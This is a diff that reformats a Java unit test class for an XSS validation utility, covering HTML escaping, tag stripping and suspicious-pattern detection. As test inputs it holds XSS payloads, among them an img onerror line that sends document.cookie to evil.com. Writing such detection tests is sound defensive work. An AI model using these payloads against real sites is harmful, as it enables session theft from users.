@@ -37,7 +37,8 @@ class XSSValidationTest {
   void testEscapeHtml() {
     // Test basic HTML escaping
     assertEquals("&lt;script&gt;", XSSValidation.escapeHtml("<script>"));
-    assertEquals("&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;",
+    assertEquals(
+        "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;",
         XSSValidation.escapeHtml("<script>alert(\"XSS\")</script>"));
     assertEquals("hello &amp; goodbye", XSSValidation.escapeHtml("hello & goodbye"));
     // Note: Apache Commons Text escapeHtml4() does not escape single quotes
@@ -98,12 +99,10 @@ class XSSValidationTest {
   @DisplayName("Should strip HTML tags from input")
   void testStripHtmlTags() {
     // Test basic tag stripping
-    assertEquals("Hello World",
-        XSSValidation.stripHtmlTags("<p>Hello <strong>World</strong></p>"));
-    assertEquals("Test content",
-        XSSValidation.stripHtmlTags("<div><span>Test</span> content</div>"));
-    assertEquals("Click here",
-        XSSValidation.stripHtmlTags("<a href=\"test.html\">Click here</a>"));
+    assertEquals("Hello World", XSSValidation.stripHtmlTags("<p>Hello <strong>World</strong></p>"));
+    assertEquals(
+        "Test content", XSSValidation.stripHtmlTags("<div><span>Test</span> content</div>"));
+    assertEquals("Click here", XSSValidation.stripHtmlTags("<a href=\"test.html\">Click here</a>"));
 
     // Test null input
     assertNull(XSSValidation.stripHtmlTags(null));
@@ -112,7 +111,8 @@ class XSSValidationTest {
     assertEquals("Plain text", XSSValidation.stripHtmlTags("Plain text"));
 
     // Test nested tags
-    assertEquals("Nested content",
+    assertEquals(
+        "Nested content",
         XSSValidation.stripHtmlTags("<div><span><b>Nested</b> content</span></div>"));
   }
 
@@ -149,7 +149,8 @@ class XSSValidationTest {
   @Test
   @DisplayName("Should detect data URI and VBScript")
   void testDetectDataUriAndVBScript() {
-    assertTrue(XSSValidation.containsSuspiciousPatterns("data:text/html,<script>alert(1)</script>"));
+    assertTrue(
+        XSSValidation.containsSuspiciousPatterns("data:text/html,<script>alert(1)</script>"));
     assertTrue(XSSValidation.containsSuspiciousPatterns("vbscript:alert('XSS')"));
   }
 
@@ -177,12 +178,13 @@ class XSSValidationTest {
   @DisplayName("Should handle complex XSS payloads")
   void testComplexXSSPayloads() {
     // Real-world XSS payload examples
-    assertTrue(XSSValidation.containsSuspiciousPatterns(
-        "<img src=x onerror=\"fetch('http://evil.com?cookie='+document.cookie)\">"));
-    assertTrue(XSSValidation.containsSuspiciousPatterns(
-        "<svg/onload=alert('XSS')>"));
-    assertTrue(XSSValidation.containsSuspiciousPatterns(
-        "<img src=x onclick=\"window.location='http://evil.com'\">"));
+    assertTrue(
+        XSSValidation.containsSuspiciousPatterns(
+            "<img src=x onerror=\"fetch('http://evil.com?cookie='+document.cookie)\">"));
+    assertTrue(XSSValidation.containsSuspiciousPatterns("<svg/onload=alert('XSS')>"));
+    assertTrue(
+        XSSValidation.containsSuspiciousPatterns(
+            "<img src=x onclick=\"window.location='http://evil.com'\">"));
   }
 
   @Test
